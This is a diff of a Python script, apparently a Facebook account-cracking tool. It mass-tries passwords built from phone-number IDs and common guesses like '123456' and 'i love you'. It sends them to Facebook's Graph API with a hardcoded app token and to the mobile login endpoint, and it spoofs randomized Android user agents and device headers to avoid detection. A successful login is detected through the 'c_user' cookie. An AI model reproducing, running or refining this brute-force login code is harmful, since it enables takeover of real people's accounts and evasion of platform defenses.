@@ -100,9 +100,9 @@ ugen=[]
 for xd in range(10000):
         aa='Mozilla/5.0 (Linux; U; Android'
         b=random.choice(['6','7','8','9','10','11','12','13','14','15'])
-        c='SM-J510F, SM-J510G, SM-J510FN, SM-J510Y, SM-J510M, SM-J510GN, SM-J510H, SM-J510MN, SM-J5108, SM-J510UN, SM-J510L, SM-J510S, SM-J510FQ, SM-J510K'
-        g='SM-J510FN Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-        h=random.randrange(100,120)
+        c='SM-A300F, SM-A300G, SM-A300H, SM-A300M'
+        g='SM-A300FU Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+        h=random.randrange(100,690)
         i='0'
         j=random.randrange(4200,4900)
         k=random.randrange(40,120)
@@ -112,12 +112,12 @@ for xd in range(10000):
 for agent in range(10000):
         aa='Mozilla/5.0 (Linux; Android ;'
         b=random.choice(['5.1.1','6','7','8','9','10','11','12','13','14','15'])
-        c='SM-G5306W, SM-G5308W, SM-G5309W, SM-G530BT, SM-G530F, SM-G530FQ, SM-G530FZ, SM-G530FZ, SM-G530H, SM-G531F, SM-G531H, SM-G530T, SM-G530W, SM-G530Y, SM-G530AZ, SM-G531Y, SM-G530T1, SM-G531M, SM-G530A, SM-G530M, SM-G531BT, SM-G530MU'
+        c='V2029, V2029_PK'
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
         e=random.randrange(1, 999)
         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='SM-G531F Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-        h=random.randrange(90,121)
+        g='V2027 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+        h=random.randrange(90,180)
         i='0'
         j=random.randrange(4200,4900)
         k=random.randrange(40,150)
@@ -127,9 +127,9 @@ for agent in range(10000):
 for xd in range(10000):
         aa='Mozilla/5.0 (Linux; U; Android'
         b=random.choice(['6','7','8','9','10','11','12','13','14','15'])
-        c='SM-G610F, SM-G610Y, SM-G610M, SM-G610'
-        g='SM-G610F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-        h=random.randrange(100,293)
+        c='CPH2349'
+        g='CPH2349 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+        h=random.randrange(100,113)
         i='0'
         j=random.randrange(4200,4900)
         k=random.randrange(40,150)
@@ -149,7 +149,7 @@ def clear():
 	os.system('clear')
 	print(logo)
 logo=("""    
- \33[38;5;46m ❝𝐒𝐜𝐫𝐢𝐩𝐭 𝐆𝐢𝐟𝐭 𝐁𝐲 𝐀𝐥𝐚𝐦𝐢𝐧 𝐇𝐚𝐬𝐚𝐧❞\n\033[1;33m----------------------------------------------\n\033[1;31m[\033[1;32m×\033[1;31m]\033[1;37m  AUTHOR   : 𝐀𝐒𝐇𝐈𝐊 \n\033[1;31m[\033[1;32m×\033[1;31m]\033[1;37m  FACEBOOK : ꕥꕥ༒ASHIKッ༒ᵸᴀᵸᴀꕥꕥ\n\033[1;31m[\033[1;32m×\033[1;31m]\033[1;37m  GITHUB   : Free User\n\033[1;31m[\033[1;32m×\033[1;31m]\033[1;37m  TOOLTYPE : FILE+RANDOM \n\033[1;31m[\033[1;32m×\033[1;31m]\033[1;37m  VERSION  : TEST-0.3 \n\033[1;33m----------------------------------------------\033[1;33m""")   
+ \33[38;5;46m ❝𝐒𝐜𝐫𝐢𝐩𝐭 𝐆𝐢𝐟𝐭 𝐁𝐲 𝐀𝐥𝐚𝐦𝐢𝐧 𝐇𝐚𝐬𝐚𝐧❞\n\033[1;33m----------------------------------------------\n\033[1;31m[\033[1;32m×\033[1;31m]\033[1;37m  AUTHOR   : 𝐀𝐒𝐇𝐈𝐊 \n\033[1;31m[\033[1;32m×\033[1;31m]\033[1;37m  FACEBOOK : ꕥꕥ༒ASHIKッ༒ᵸᴀᵸᴀꕥꕥ\n\033[1;31m[\033[1;32m×\033[1;31m]\033[1;37m  Woarking : 4G,5G,Wifi\n\033[1;31m[\033[1;32m×\033[1;31m]\033[1;37m  TOOLTYPE : FILE+RANDOM \n\033[1;31m[\033[1;32m×\033[1;31m]\033[1;37m  VERSION  : TEST-0.7 \n\033[1;33m----------------------------------------------\033[1;33m""")   
 def line():
 	print(f'\033[1;37m----------------------------------------------')
  
@@ -343,7 +343,7 @@ def bd():
                         line()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,ids[:8],ids[:7],'908070','fatema','jannat','love12','Bangla','@@@###','123456','102030','123456789','708090','i love you','freefire','garena12','gaming12']
+                                passlist = [psx,ids,ids[:8],ids[:7],'908070','fatema','jannat','12345678','Bangla','@@@###','123456','102030','123456789','708090','i love you','freefire','garena12','gaming12']
                                 S1N.submit(rd,ids,passlist)
                 print('\033[1;37m')
                 line()
@@ -557,7 +557,7 @@ def rd(ids,passlist):
 	try:
 		global oks,loop
                 
-		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92m𝐀𝐒𝐇𝐈𝐊\x1b[1;92m-\x1b[1;92mAR\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
+		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92m𝐀𝐒𝐇𝐈𝐊\x1b[1;92m-\x1b[1;92m𝐀𝐑\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
 		for pas in passlist:                                          
 			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'			
 			head = {'User-Agent':S2(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
@@ -608,20 +608,24 @@ def bd1(ids,passlist):
             "email":ids,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'www.facebook.com',
+            header_freefb = {'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Microsoft Edge";v="124", "Chromium";v="126"',
-    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="124", "Chromium";v="126"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
+    'dpr': '2.75',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"23124RA7EO"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"14.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
+    'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6332.195 Safari/537.36 Edg/124.0.2327.68',}
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',}
             lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
